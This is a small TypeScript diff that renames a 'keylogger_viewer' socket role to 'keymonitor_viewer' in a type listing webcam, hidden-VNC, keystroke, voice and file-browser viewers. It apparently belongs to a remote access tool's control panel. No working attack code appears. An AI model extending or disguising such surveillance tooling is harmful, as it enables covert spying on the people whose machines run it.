@@ -1,4 +1,4 @@
-export type SocketRole = "client" | "viewer" | "console_viewer" | "rd_viewer" | "webcam_viewer" | "hvnc_viewer" | "file_browser_viewer" | "process_viewer" | "keylogger_viewer" | "voice_viewer" | "notifications_viewer";
+export type SocketRole = "client" | "viewer" | "console_viewer" | "rd_viewer" | "webcam_viewer" | "hvnc_viewer" | "file_browser_viewer" | "process_viewer" | "keymonitor_viewer" | "voice_viewer" | "notifications_viewer";
 
 const textEncoder = new TextEncoder();
 
